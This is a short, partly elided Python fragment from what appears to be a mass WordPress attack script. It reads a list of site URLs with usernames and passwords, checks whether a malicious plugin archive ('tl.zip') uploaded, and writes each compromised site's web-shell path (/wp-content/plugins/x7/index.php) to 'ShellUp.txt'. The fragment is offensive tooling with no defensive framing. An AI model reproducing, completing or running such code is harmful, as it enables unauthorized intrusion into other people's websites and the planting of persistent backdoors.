...
def Check_Alive(site):
	try:
		...
		#format The List URL , url , username , password
		...
		if 'tl.zip' in Exploting.content:
			current(' -| ' + url + ' ----> is Uploading -:)')
			open('ShellUp.txt','a').write(url + "/wp-content/plugins/x7/index.php\n")
		else:
			error(' -| ' + url + ' ----> is Not Uploading  !')
